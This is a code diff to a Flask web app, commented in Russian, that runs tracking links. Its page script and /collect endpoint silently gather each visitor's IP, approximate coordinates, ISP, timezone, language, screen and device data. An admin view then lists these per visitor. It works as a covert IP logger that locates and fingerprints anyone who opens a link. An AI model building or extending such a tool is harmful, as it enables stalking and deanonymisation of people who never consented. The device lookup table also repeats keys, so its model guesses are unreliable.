@@ -1,6 +1,6 @@
 from flask import Flask, request, send_from_directory, jsonify, render_template_string, redirect
-import sqlite3, uuid, os, time, requests, json, mimetypes
-from user_agents import parse  # <-- НОВЫЙ ИМПОРТ
+import sqlite3, uuid, os, time, requests, json, mimetypes, re
+from user_agents import parse
 
 app = Flask(__name__)
 UPLOAD_FOLDER = 'static/uploads'
@@ -79,43 +79,110 @@ def get_real_ip():
     return request.remote_addr
 
 def get_geo_info(ip):
+    """Определение геолокации через ipapi.co (точность до 500 м, 1000 запросов/день бесплатно)"""
     result = {
-        'basic_city': '',
-        'basic_country': '',
-        'extra_country': '',
-        'extra_region': '',
-        'extra_city': '',
-        'extra_loc': '',
-        'extra_org': '',
-        'extra_timezone': '',
-        'extra_postal': '',
+        'city': '',
+        'country': '',
+        'region': '',
+        'loc': '',
+        'org': '',
+        'timezone': '',
+        'postal': '',
         'source': 'none'
     }
+    # Пробуем ipapi.co
+    try:
+        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=3)
+        if resp.status_code == 200:
+            data = resp.json()
+            if 'error' not in data:
+                result['city'] = data.get('city', '')
+                result['country'] = data.get('country_name', '')
+                result['region'] = data.get('region', '')
+                loc = data.get('latitude', '')
+                if loc and data.get('longitude'):
+                    result['loc'] = f"{data.get('latitude')},{data.get('longitude')}"
+                result['org'] = data.get('org', '')
+                result['timezone'] = data.get('timezone', '')
+                result['postal'] = data.get('postal', '')
+                result['source'] = 'ipapi.co'
+                return result
+    except:
+        pass
+
+    # Запасной вариант: ip-api.com (город, без координат)
     try:
         resp = requests.get(f'http://ip-api.com/json/{ip}?fields=city,country,regionName,timezone', timeout=3)
         if resp.status_code == 200:
             data = resp.json()
-            result['basic_city'] = data.get('city', '')
-            result['basic_country'] = data.get('country', '')
-            result['basic_region'] = data.get('regionName', '')
-            result['basic_timezone'] = data.get('timezone', '')
+            if data.get('status') == 'success':
+                result['city'] = data.get('city', '')
+                result['country'] = data.get('country', '')
+                result['region'] = data.get('regionName', '')
+                result['timezone'] = data.get('timezone', '')
+                result['source'] = 'ip-api.com'
+                # loc не заполняем, т.к. нет координат
     except:
         pass
-    try:
-        resp = requests.get(f'https://ipinfo.io/{ip}/json', timeout=3)
-        if resp.status_code == 200:
-            data = resp.json()
-            result['extra_country'] = data.get('country', '')
-            result['extra_region'] = data.get('region', '')
-            result['extra_city'] = data.get('city', '')
-            result['extra_loc'] = data.get('loc', '')
-            result['extra_org'] = data.get('org', '')
-            result['extra_timezone'] = data.get('timezone', '')
-            result['extra_postal'] = data.get('postal', '')
-            result['source'] = 'ipinfo.io'
-    except:
-        result['source'] = 'ip-api.com (basic)'
     return result
+
+# ========== БАЗА DPI ДЛЯ ОПРЕДЕЛЕНИЯ МОДЕЛИ ==========
+# Формат: (ширина, высота, плотность) -> (бренд, модель)
+DEVICE_DB = {
+    # iPhone
+    (1170, 2532, 3.0): ('Apple', 'iPhone 14 Pro / 15 Pro'),
+    (1179, 2556, 3.0): ('Apple', 'iPhone 15 Pro Max'),
+    (1125, 2436, 3.0): ('Apple', 'iPhone X / XS / 11 Pro'),
+    (1242, 2688, 3.0): ('Apple', 'iPhone XS Max / 11 Pro Max'),
+    (828, 1792, 2.0): ('Apple', 'iPhone XR / 11'),
+    (750, 1334, 2.0): ('Apple', 'iPhone 6/7/8 / SE2/SE3'),
+    (1080, 1920, 2.0): ('Apple', 'iPhone 6 Plus / 7 Plus / 8 Plus'),
+    (375, 812, 3.0): ('Apple', 'iPhone X (логическое)'),  # для некоторых случаев
+    # Samsung Galaxy
+    (1080, 2340, 3.0): ('Samsung', 'Galaxy S21/S22/S23 (базовый)'),
+    (1440, 3040, 3.0): ('Samsung', 'Galaxy S21+/S22+/S23+'),
+    (1440, 3088, 3.0): ('Samsung', 'Galaxy S21 Ultra / S22 Ultra / S23 Ultra'),
+    (1080, 2400, 3.0): ('Samsung', 'Galaxy A52/A53/A54'),
+    (720, 1600, 2.0): ('Samsung', 'Galaxy A12/A13'),
+    # Google Pixel
+    (1080, 2400, 2.75): ('Google', 'Pixel 7 / 8'),
+    (1440, 3120, 3.0): ('Google', 'Pixel 7 Pro / 8 Pro'),
+    (1080, 2340, 2.5): ('Google', 'Pixel 6'),
+    (1440, 3120, 2.5): ('Google', 'Pixel 6 Pro'),
+    # Xiaomi
+    (1080, 2400, 3.0): ('Xiaomi', 'Redmi Note 10/11/12'),
+    (1080, 2340, 3.0): ('Xiaomi', 'Xiaomi 11/12'),
+    (1440, 3200, 3.0): ('Xiaomi', 'Xiaomi 12 Pro / 13 Pro'),
+    (720, 1600, 2.0): ('Xiaomi', 'Redmi 9/10'),
+    # OnePlus
+    (1080, 2400, 3.0): ('OnePlus', 'OnePlus 9/10/11'),
+    (1440, 3216, 3.0): ('OnePlus', 'OnePlus 10 Pro/11 Pro'),
+    # Huawei
+    (1080, 2400, 3.0): ('Huawei', 'P30/P40'),
+    (1440, 3120, 3.0): ('Huawei', 'Mate 40 Pro'),
+}
+
+def guess_device_by_screen(screen_str, dpr):
+    """По строке screen вида 'WxHxD' и плотности (devicePixelRatio) угадывает модель"""
+    try:
+        parts = screen_str.split('x')
+        if len(parts) >= 2:
+            w = int(parts[0])
+            h = int(parts[1])
+            # Для некоторых устройств ширина и высота могут быть перепутаны, нормализуем
+            if w < h:
+                w, h = h, w
+            # Ищем в базе (с допуском)
+            best_match = None
+            for (bw, bh, bdpr), (brand, model) in DEVICE_DB.items():
+                if abs(w - bw) <= 5 and abs(h - bh) <= 5 and abs(dpr - bdpr) <= 0.1:
+                    best_match = (brand, model)
+                    break
+            if best_match:
+                return best_match
+    except:
+        pass
+    return None, None
 
 # ========== ДЕКОРАТОР ДЛЯ ПРОВЕРКИ СЕКРЕТА ==========
 def require_secret(f):
@@ -287,9 +354,11 @@ TRACK_PAGE_TEMPLATE = """
     </div>
     <script>
     (function() {
+        // Передаём на сервер screen и devicePixelRatio для определения модели
         const data = {
             uid: "{{ uid }}",
             screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
+            dpr: window.devicePixelRatio || 1,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             lang: navigator.language,
             userAgent: navigator.userAgent,
@@ -423,7 +492,7 @@ def track(uid):
                                   uid=uid, filename=filename, original_name=original_name, mime_type=mime_type,
                                   title=title, custom_text=text, bg_color=bg)
 
-# ========== СБОР ДАННЫХ (с парсингом User-Agent) ==========
+# ========== СБОР ДАННЫХ (с парсингом User-Agent и определением модели по DPI) ==========
 @app.route('/collect', methods=['POST'])
 def collect():
     data = request.get_json()
@@ -432,42 +501,56 @@ def collect():
     uid = data['uid']
     ip = get_real_ip()
     ua = request.headers.get('User-Agent', '')
+    
+    # Геолокация
     geo = get_geo_info(ip)
-    city = geo.get('basic_city', '')
+    city = geo.get('city', '')
     
     # Парсинг User-Agent
     parsed_ua = parse(ua)
     os_version = parsed_ua.os.version_string
-    device_model = parsed_ua.device.family
-    device_brand = parsed_ua.device.brand
-    # Если модель не определена, попробуем извлечь из самого User-Agent
+    device_model_ua = parsed_ua.device.family
+    device_brand_ua = parsed_ua.device.brand
+    
+    # Определение модели по DPI (экран и плотность)
+    screen_str = data.get('screen', '')
+    dpr = data.get('dpr', 1)
+    brand_dpi, model_dpi = guess_device_by_screen(screen_str, dpr)
+    
+    # Выбираем более точную модель (если DPI определил, используем его, иначе из User-Agent)
+    if model_dpi:
+        device_model = model_dpi
+        device_brand = brand_dpi if brand_dpi else device_brand_ua
+    else:
+        device_model = device_model_ua
+        device_brand = device_brand_ua
+    
+    # Если модель не определена, пробуем извлечь из User-Agent вручную
     if not device_model or device_model == 'Other':
-        # Простейший парсинг для Android и iPhone
         if 'iPhone' in ua:
-            import re
             match = re.search(r'iPhone(\d+,\d+)', ua)
             if match:
                 device_model = 'iPhone ' + match.group(1)
             else:
                 device_model = 'iPhone'
         elif 'Android' in ua:
-            import re
             match = re.search(r'; (SM-[A-Za-z0-9]+)', ua)
             if match:
                 device_model = match.group(1)
             else:
                 device_model = 'Android-устройство'
-    # Если бренд не определён
+    
     if not device_brand:
         device_brand = 'Неизвестно'
+    
+    # Оператор из гео
+    operator = geo.get('org', '')
     
     # Добавляем новые поля в data
     data['os_version'] = os_version
     data['device_model'] = device_model
     data['device_brand'] = device_brand
-    # Оператор уже есть в geo['extra_org'], добавим его тоже в data для удобства
-    data['operator'] = geo.get('extra_org', '')
-    
+    data['operator'] = operator
     data['geo'] = geo
     fingerprint = json.dumps(data)
     conn = sqlite3.connect(DB)
@@ -551,31 +634,36 @@ def admin_logs_detail(secret, num):
     else:
         for ip, ua, city, fp, t in logs:
             html += f"<div class='log-entry'><span class='time'>{time.ctime(t)}</span><br>IP: {ip}<br>"
-            html += f"Город (базовый): {city}<br>"
+            html += f"Город: {city}<br>"
             if fp:
                 try:
                     fp_data = json.loads(fp)
-                    # Дополнительная геолокация
+                    # Геолокация (дополнительная)
                     geo = fp_data.get('geo', {})
                     if geo and geo.get('source') != 'none':
                         html += "<div class='geo-info'><b>🌍 Дополнительная геолокация:</b><br>"
-                        html += f"Страна: {geo.get('extra_country', geo.get('basic_country', ''))}<br>"
-                        html += f"Регион: {geo.get('extra_region', '')}<br>"
-                        html += f"Город: {geo.get('extra_city', geo.get('basic_city', ''))}<br>"
-                        if geo.get('extra_loc'):
-                            html += f"Координаты: {geo['extra_loc']}<br>"
-                        if geo.get('extra_org'):
-                            html += f"Провайдер (оператор): {geo['extra_org']}<br>"
-                        if geo.get('extra_timezone'):
-                            html += f"Часовой пояс: {geo['extra_timezone']}<br>"
+                        if geo.get('country'):
+                            html += f"Страна: {geo.get('country')}<br>"
+                        if geo.get('region'):
+                            html += f"Регион: {geo.get('region')}<br>"
+                        if geo.get('city'):
+                            html += f"Город: {geo.get('city')}<br>"
+                        if geo.get('loc'):
+                            html += f"Координаты: {geo['loc']}<br>"
+                        if geo.get('org'):
+                            html += f"Провайдер (оператор): {geo['org']}<br>"
+                        if geo.get('timezone'):
+                            html += f"Часовой пояс: {geo['timezone']}<br>"
                         html += f"Источник: {geo.get('source', 'неизвестно')}<br>"
                         html += "</div>"
-                    # Новые поля: ОС, модель, бренд
+                    # Новые поля: ОС, модель, бренд, оператор
                     html += f"<b>Версия ОС:</b> {fp_data.get('os_version', 'неизвестно')}<br>"
                     html += f"<b>Модель устройства:</b> {fp_data.get('device_model', 'неизвестно')}<br>"
                     html += f"<b>Бренд:</b> {fp_data.get('device_brand', 'неизвестно')}<br>"
+                    html += f"<b>Оператор (из ip):</b> {fp_data.get('operator', 'неизвестно')}<br>"
                     # Остальные данные
                     html += f"<b>Экран:</b> {fp_data.get('screen', '')}<br>"
+                    html += f"<b>Плотность пикселей:</b> {fp_data.get('dpr', '')}<br>"
                     html += f"<b>Часовой пояс:</b> {fp_data.get('timezone', '')}<br>"
                     html += f"<b>Язык:</b> {fp_data.get('lang', '')}<br>"
                     html += f"<b>Платформа:</b> {fp_data.get('platform', '')}<br>"
